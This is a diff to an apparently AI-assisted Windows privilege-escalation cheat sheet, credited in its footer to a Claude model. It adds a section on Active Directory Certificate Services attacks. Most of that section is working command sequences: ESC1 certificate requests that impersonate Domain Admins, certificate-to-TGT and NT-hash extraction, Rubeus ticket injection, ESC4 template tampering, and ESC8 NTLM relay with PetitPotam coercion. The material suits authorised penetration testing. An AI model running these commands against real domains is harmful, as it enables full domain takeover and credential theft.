@@ -30,6 +30,7 @@ Common writable staging dir: `C:\Windows\Temp`
 | [Mimikatz](https://github.com/gentilkiwi/mimikatz) | Credential dumping, token manipulation, PTH |
 | [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI) | DPAPI blob decryption |
 | [keepass2john](https://github.com/openwall/john) | Extract hash from .kdbx for cracking |
+| [PrivescCheck](https://github.com/itm4n/PrivescCheck) | PowerShell privesc enum — `Invoke-PrivescCheck -Extended` |
 
 ---
 
@@ -771,6 +772,75 @@ powershell -w hidden -enc <base64_command>
 
 ---
 
+## ADCS — Active Directory Certificate Services
+
+AD CS misconfigurations allow low-priv domain users to request certificates for other users (including Domain Admins), enabling full domain compromise. ESC1 is the most common.
+
+```powershell
+# --- Enumeration ---
+
+# Certify (Windows — from domain user shell)
+.\Certify.exe find /vulnerable
+# Lists: CA name, vulnerable templates, ESC class, who can enroll
+
+# Certipy (Kali)
+certipy find -u <user>@<domain> -p <pass> -dc-ip <dc-ip> -vulnerable -stdout
+```
+
+**ESC1 — Enrollee Supplies Subject (SAN in request)**
+
+Template allows requester to specify Subject Alternative Name → request cert for any user.
+
+```powershell
+# Certify — request cert for Domain Admin
+.\Certify.exe request /ca:<SERVER>\<CA_NAME> /template:<VULNERABLE_TEMPLATE> /altname:<da_user>
+# Outputs: cert.pem
+```
+
+```bash
+# Convert PEM to PFX (Kali)
+openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx -passout pass:Password123
+
+# Certipy ESC1 — one command
+certipy req -u <user>@<domain> -p <pass> -ca <CA_NAME> \
+  -template <TEMPLATE> -upn <da_user>@<domain> -dc-ip <dc-ip>
+# Outputs: <da_user>.pfx
+
+# Authenticate with cert → get TGT + NT hash
+certipy auth -pfx <da_user>.pfx -dc-ip <dc-ip>
+# Returns: NT hash — use with PTH
+```
+
+```powershell
+# Rubeus — use cert to get TGT on Windows
+.\Rubeus.exe asktgt /user:<da_user> /certificate:cert.pfx /password:Password123 /ptt
+# Passes ticket into memory — klist to verify
+```
+
+**ESC4 — Vulnerable Template ACL (write access to template)**
+
+```bash
+certipy template -u <user>@<domain> -p <pass> -template <TEMPLATE> -save-old
+# Modify template to enable ESC1, then exploit as above
+certipy req -u <user>@<domain> -p <pass> -ca <CA> -template <TEMPLATE> -upn <da>@<domain>
+certipy template -u <user>@<domain> -p <pass> -template <TEMPLATE> -configuration <old_config>
+```
+
+**ESC8 — NTLM Relay to AD CS HTTP Enrollment**
+
+```bash
+# If AD CS web enrollment is on HTTP (not HTTPS + no EPA):
+# Relay NTLM auth from DC to CA enrollment endpoint
+certipy relay -ca <ca-ip> -template DomainController
+# Trigger DC auth: PetitPotam, Coercer, or responder
+python3 PetitPotam.py -u <user> -p <pass> <attacker-ip> <dc-ip>
+# Certipy relay captures DC cert → auth → DA
+```
+
+> [!tip] Run `certipy find` first — it labels each finding with the ESC class and impact. ESC1, ESC2, ESC4, ESC6, and ESC8 are the most commonly exploitable. Requires domain user account minimum.
+
+---
+
 ## Kernel Exploits
 
 Last resort — noisy, may crash system.
@@ -868,12 +938,13 @@ OTHER VECTORS
 [ ] UAC level + integrity level check + bypass if needed
 [ ] Named pipes — weak ACLs
 [ ] Writable shares → SCF/URL file → NTLMv2 hash capture
+[ ] ADCS — certipy find -vulnerable / Certify.exe find /vulnerable (ESC1-ESC8)
 [ ] Kernel exploits (Watson / WES-NG / local_exploit_suggester)
-[ ] winPEAS for anything missed
+[ ] winPEAS / PrivescCheck for anything missed
 ```
 
 ---
 
 *Created: 2026-02-27*
-*Updated: 2026-05-13*
+*Updated: 2026-05-14*
 *Model: claude-sonnet-4-6*
